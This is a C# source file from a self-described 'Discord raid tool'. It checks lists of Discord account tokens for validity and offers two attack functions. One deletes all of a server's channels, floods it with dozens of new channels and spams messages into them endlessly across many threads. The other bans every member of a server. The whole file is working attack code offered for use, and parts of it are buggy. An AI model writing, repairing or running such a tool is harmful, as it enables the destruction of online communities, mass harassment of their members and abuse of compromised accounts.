using Discord;
using Discord.Gateway;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using static Discord_Raid_Tool_Final.TokensChecker;

namespace Discord_Raid_Tool_Final
{
    public static class DiscordUtils
    {
        public static List<GuildChannel> newChannels = new List<GuildChannel>();

        public static TokensList CheckTokens(List<string> Tokens)
        {
            TokensList tokens = new TokensList();
            Tokens.Distinct().ToList();
            Tokens.RemoveAll(t => t.Length < 59);

            for (int i = 0; i < Tokens.Count; ++i)
            {
                if (!Functions.IsValidToken(Tokens[i]))
                {
                    tokens.NotWorking.Add(Tokens[i]);
                    continue;
                }

                if (!Functions.IsTokenUsable(Tokens[i]))
                {
                    tokens.Unverified.Add(Tokens[i]);
                    continue;
                }

                tokens.Working.Add(Tokens[i]);
            }

            return tokens;
        }

        public static void NukeGuild(DiscordSocketClient client, ulong guildId, string Message, string[] Names, int MessageThreads = 20, bool first = true, bool TTS = false)
        {
            MessageThreads = MessageThreads <= 4 ? 8 : MessageThreads;
            Thread.Sleep(500);
            Random random = new Random();

            for (int i = 0; i < Names.Length; ++i)
                Names[i] = Names[i].Replace(" ", "᲼");

            IReadOnlyList<PartialGuild> a = client.GetGuilds();
            a = null;

            Thread deleteChannels = new Thread(() =>
            {
                var guilds = client.GetGuilds()[0];
                IReadOnlyList<GuildChannel> channels = client.GetGuildChannels(guilds.Id);
                foreach (GuildChannel channel in channels.ToList()) { try { channel.Delete(); } catch (DiscordHttpException ex) { Console.WriteLine(ex.Message); } }
            });

            Thread deleteChannels2 = new Thread(() =>
            {
                var guilds = client.GetGuilds()[0];
                IReadOnlyList<GuildChannel> channels = client.GetGuildChannels(guilds.Id);
                foreach (GuildChannel channel in channels.Reverse().ToList()) { try { channel.Delete(); } catch (DiscordHttpException ex) { Console.WriteLine(ex.Message); } }
            });

            Thread createChannels = new Thread(() =>
            {
                for (int i = 0; i < 70; ++i)
                    try { newChannels.Add(client.CreateGuildChannel(guildId, Names[random.Next(Names.Length)], ChannelType.Text)); } catch { }
            });

            Thread createChannels1 = new Thread(() =>
            {
                for (int i = 0; i < 70; ++i)
                    try { newChannels.Add(client.CreateGuildChannel(guildId, Names[random.Next(Names.Length)], ChannelType.Text)); } catch { }
            });

            if (first)
            {
                deleteChannels.Start();
                deleteChannels2.Start();

                while (deleteChannels2.ThreadState == ThreadState.Running || deleteChannels2.ThreadState == ThreadState.Running)
                    Thread.Sleep(100);
            }

            createChannels.Start();
            createChannels1.Start();

            for (int i = 0; i < MessageThreads; ++i)
            {
                Thread spamNewChannels = new Thread(() =>
                {
                    while (true)
                    {
                        for (int j = 0; j < newChannels.ToList().Count; ++j)
                        {
                            try { client.SendMessage(newChannels.ToList()[random.Next(0, newChannels.ToList().Count)], Message, TTS); } catch { }
                        }
                    }
                });
                spamNewChannels.Start();
            }
        }

        public static void BanEveryone(DiscordSocketClient client, ulong guildId, ulong channelId)
        {
            List<ulong> ids = new List<ulong>();

            var guilds = client.GetGuilds();
            foreach (var user in client.GetGuildChannelMembers(guilds[0].Id, guilds[0].GetChannels()[0].Id, new MemberListQueryOptions { Count = 10 }))
                ids.Add(user.User.Id);

            IReadOnlyList<GuildMember> guildMembers = client.GetGuildMembers(guildId);

            var lists = Chunk<GuildMember>(guildMembers.ToList(), 4);
            for (int i = 0; i < lists.Count - 1; ++i)
            {
                Thread thread = new Thread(() =>
                {
                    foreach (ulong member in lists[i])
                    {
                        if (member != client.User.Id)
                        {
                            try { client.GetGuildMember(guildId, member).Ban(); } catch (Exception ex) { Console.WriteLine(ex.Message); }
                        }
                    }
                });
                thread.Start();
            }
        }

        public static List<List<T>> Chunk<T>(this List<T> source, int chunkSize)
        {
            return source
                .Select((x, i) => new { Index = i, Value = x })
                .GroupBy(x => x.Index / chunkSize)
                .Select(x => x.Select(v => v.Value).ToList())
                .ToList();
        }
    }
}